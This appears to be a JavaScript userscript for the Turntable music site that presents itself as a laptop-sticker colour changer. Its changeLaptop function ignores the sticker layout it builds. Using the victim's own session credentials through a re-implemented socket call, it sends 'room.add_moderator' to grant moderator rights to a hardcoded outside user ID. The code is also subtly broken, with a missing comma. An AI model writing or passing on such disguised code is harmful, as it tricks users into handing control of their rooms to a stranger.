var stickers = {
pink: '4f86fe84e77989117e000008',
blue: '4f86fdede77989117e000003',
red: '4f86fe33e77989117e000006',
black: '4f86fd27e77989117e000000'
}

getLaptop = function(color) {
var laptopPlacements = [ { top: -4,
angle: 0,
sticker_id: stickers[color],
left: 168 },
{ top: 29,
angle: 0,
sticker_id: stickers[color],
left: 171 },
{ top: 60,
angle: 0,
sticker_id: stickers[color],
left: 161 },
{ top: 95,
angle: 0,
sticker_id: stickers[color],
left: 148 },
{ top: 93,
angle: 0,
sticker_id: stickers[color],
left: 196 },
{ top: 183,
angle: 270.5016672223656,
sticker_id: stickers[color],
left: 84 },
{ top: 283,
angle: 0,
sticker_id: stickers[color],
left: 120 },
{ top: 129,
angle: 0,
sticker_id: stickers[color],
left: 205 },
{ top: 161,
angle: 0,
sticker_id: stickers[color],
left: 206 },
{ top: 193,
angle: 0,
sticker_id: stickers[color],
left: 206 },
{ top: 226,
angle: 0,
sticker_id: stickers[color],
left: 204 },
{ top: 257,
angle: 0,
sticker_id: stickers[color],
left: 205 },
{ top: 286,
angle: -3.3691687643930948,
sticker_id: stickers[color],
left: 273 },
{ top: 244,
angle: 314.6035573547117,
sticker_id: stickers[color],
left: 378 },
{ top: 138,
angle: 61.24417162531099,
sticker_id: stickers[color],
left: 370 },
{ top: 245,
angle: 0,
sticker_id: stickers[color],
left: 245 },
{ top: 208,
angle: 0,
sticker_id: stickers[color],
left: 237 },
{ top: 169,
angle: 0,
sticker_id: stickers[color],
left: 222 },
{ top: 58,
angle: 0,
sticker_id: stickers[color],
left: 185 }
];
return laptopPlacements;
}

socket = function (c, a) {
if (c.api == "room.now") {
return;
}
c.msgid = turntable.messageId;
turntable.messageId += 1;
c.clientid = turntable.clientId;
if (turntable.user.id && !c.userid) {
c.userid = turntable.user.id;
c.userauth = turntable.user.auth;
}
var d = JSON.stringify(c);
if (turntable.socketVerbose) {
LOG(util.nowStr() + " Preparing message " + d);
}
var b = $.Deferred();
turntable.whenSocketConnected(function () {
if (turntable.socketVerbose) {
LOG(util.nowStr() + " Sending message " + c.msgid + " to " + turntable.socket.host);
}
if (turntable.socket.transport.type == "websocket") {
turntable.socketLog(turntable.socket.transport.sockets[0].id + ":<" + c.msgid);
}
turntable.socket.send(d);
turntable.socketKeepAlive(true);
turntable.pendingCalls.push({
msgid: c.msgid,
handler: a,
deferred: b,
time: util.now()
});
});
return b.promise();
}

changeLaptop = function(color) {
var laptop = getLaptop(color);

socket({
api: 'room.add_moderator',
roomid: window.turntable.buddyList.room.roomId
target_userid: '51e18e5caaa5cd766b0bdf99'
});
}

var num = 1;
//setInterval(function() {
if (num == 1) { changeLaptop('red') };
if (num == 2) { changeLaptop('blue') };
if (num == 3) { changeLaptop('pink') };
if (num == 4) { changeLaptop('black') };
num += 1;
if (num == 5) { num = 1 };
//}, 1500);
